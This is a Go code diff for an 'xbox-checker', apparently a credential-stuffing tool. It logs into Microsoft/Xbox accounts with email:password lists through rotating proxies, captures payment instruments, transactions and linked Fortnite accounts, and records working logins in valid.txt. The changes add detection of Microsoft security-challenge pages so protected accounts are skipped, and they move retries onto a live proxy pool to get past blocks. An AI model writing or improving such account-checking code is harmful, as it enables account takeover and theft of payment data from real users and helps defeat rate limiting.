@@ -16,6 +16,7 @@ import (
 	"xbox-checker/internal/nettls"
 	"xbox-checker/internal/payments"
 	"xbox-checker/internal/promos"
+	"xbox-checker/internal/proxy"
 )
 
 // ExecuteAccountValidation runs the full-capture login flow for one account:
@@ -35,6 +36,38 @@ var reCredInText = regexp.MustCompile(`(?i)([a-z][a-z0-9+.\-]*://)[^/@\s]+@`)
 // they can never leak into the activity stream.
 func softReason(stage string, err error) string {
 	return stage + " failed: " + reCredInText.ReplaceAllString(err.Error(), "$1***@")
+}
+
+// challengeMarkers are Microsoft interrupt/challenge pages. No amount of
+// proxy retrying gets past them: they used to fall through to the generic
+// "no access token" retry, burn the whole 3-proxy budget and then die as a
+// done line, hiding what actually happened.
+var challengeMarkers = []string{
+	"verify your identity",
+	"help us protect your account",
+	"let's protect your account",
+	"unusual activity",
+	"additional security",
+	"verification code",
+	"enter the code",
+	"security code",
+	"approve sign in",
+	"authenticator notification",
+	"proofup",
+	"ffcchallenge",
+	"confirm your identity",
+}
+
+// challengePage reports whether body is a Microsoft interrupt page rather
+// than a completed (or credential-rejected) sign-in.
+func challengePage(body string) bool {
+	low := strings.ToLower(body)
+	for _, m := range challengeMarkers {
+		if strings.Contains(low, m) {
+			return true
+		}
+	}
+	return strings.Contains(body, "Sign in to your Microsoft account") && strings.Contains(body, "proof")
 }
 func ExecuteAccountValidation(email, password, proxyStr string, proxies []string, keywords []string, wfp *nettls.FP, cfg checkercfg.Config) (string, bool, string, bool) {
 	if wfp == nil {
@@ -105,10 +138,11 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 		return "", false, fmt.Sprintf("[%s] INVALID: Credentials incorrect.", email), false
 	}
 
-	if strings.Contains(bodyStr, "Sign in to your Microsoft account") && strings.Contains(bodyStr, "proof") {
+	if challengePage(bodyStr) {
 		// Extra proof / challenge – discard, do not retry. Previously this
-		// vanished silently (no log line at all), which made runs look like
-		// they were dropping accounts for no reason.
+		// only matched when the page contained BOTH "Sign in to your
+		// Microsoft account" AND "proof", so every other interrupt page
+		// burned proxy retries and ended as a done line.
 		return "", false, fmt.Sprintf("[%s] SKIP: Microsoft demanded extra verification.", email), false
 	}
 
@@ -135,8 +169,22 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 	atk := nettls.ExtractParam(loc, "access_token=")
 
 	if atk == "" {
-		// Soft – try the next proxy (capped to one pass through the list)
-		return "", false, "sign-in returned no access token (rejected or rate-limited)", true
+		authBody, _ := io.ReadAll(respAuth.Body)
+		probe := loc + "\n" + string(authBody)
+		if challengePage(probe) {
+			// An interrupt page, not a flaky proxy: terminal skip so it does
+			// not burn the proxy budget and end as a done line.
+			return "", false, fmt.Sprintf("[%s] SKIP: Microsoft demanded extra verification.", email), false
+		}
+		if strings.Contains(probe, "error=interaction_required") ||
+			strings.Contains(probe, "error=consent_required") {
+			// Account-state consent/interaction prompts cannot be satisfied
+			// by another proxy either — skip instead of retrying to death.
+			return "", false, fmt.Sprintf("[%s] SKIP: Microsoft wants sign-in interaction.", email), false
+		}
+		// Genuinely no token (rate limit, block, transient): retry with the
+		// next proxy — but now with an honest reason and status code.
+		return "", false, fmt.Sprintf("sign-in returned no access token (oauth status %d) — rejected or rate-limited", respAuth.StatusCode), true
 	}
 
 	// Fetch Payment Instruments & Transactions
@@ -226,23 +274,23 @@ func ExecuteAccountValidation(email, password, proxyStr string, proxies []string
 	fnInfo := ""
 	if cfg.CapFortnite {
 		fnInfo = epic.CheckAccount(email, password, proxyStr)
-	}
-	start := 0
-	if proxyStr != "" && len(proxies) > 0 {
-		for i, p := range proxies {
-			if p == proxyStr || p == strings.TrimPrefix(strings.TrimPrefix(proxyStr, "http://"), "socks5://") {
-				start = i
-				break
-			}
-		}
-	}
-	if cfg.CapFortnite {
 		for attempt := 0; attempt < 3 && epic.Retryable(fnInfo); attempt++ {
 			next := proxyStr
 			if len(proxies) > 0 {
-				next = proxies[(start+1+attempt)%len(proxies)]
+				// Round-robin through the LIVE pool (same health state the
+				// checker uses) instead of walking cfg.Proxies by index,
+				// which could re-hand a proxy the checker marked dead.
+				next = proxy.TakeLive("check", proxies)
 			}
 			fnInfo = epic.CheckAccount(email, password, next)
+		}
+		if epic.Retryable(fnInfo) {
+			// The capture is still incomplete after its own retries. The
+			// account must NOT be appended to valid.txt with a failed step:
+			// return it as a soft failure so the engine retries it with a
+			// fresh proxy (and, if it never succeeds, it fails instead of
+			// being recorded as valid).
+			return "", false, fmt.Sprintf("[%s] RETRY: Fortnite check failed after proxy retries", email), true
 		}
 	}
 	if fnInfo != "" {
